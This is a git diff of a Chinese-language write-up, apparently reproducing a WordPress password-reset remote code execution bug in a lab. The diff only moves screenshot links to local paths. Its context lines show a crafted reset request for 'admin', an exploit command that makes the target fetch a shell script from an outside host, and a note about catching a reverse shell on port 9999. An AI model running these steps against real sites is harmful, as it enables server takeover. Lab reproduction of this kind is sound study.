@@ -31,9 +31,9 @@ Content-Type: application/x-www-form-urlencoded
 wp-submit=Get+New+Password&redirect_to=&user_login=admin
 ```
 
-![image-20220302225431160](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203022254237.png)
+![image-20220302225431160](./images/202203022254237.png)
 
-![image-20220302225419095](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203022254142.png)
+![image-20220302225419095](./images/202203022254142.png)
 
 但实际利用起来，还是有一些坑需要踏过。具体的坑有这么几个：
 
@@ -72,7 +72,7 @@ python wordpress.py http://192.168.174.128:8080 example.com/shell.sh
 
 监听9999端口，接收反弹shell：
 
-![image-20220302225928420](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203022259514.png)
+![image-20220302225928420](./images/202203022259514.png)
 
 ## 漏洞POC
 
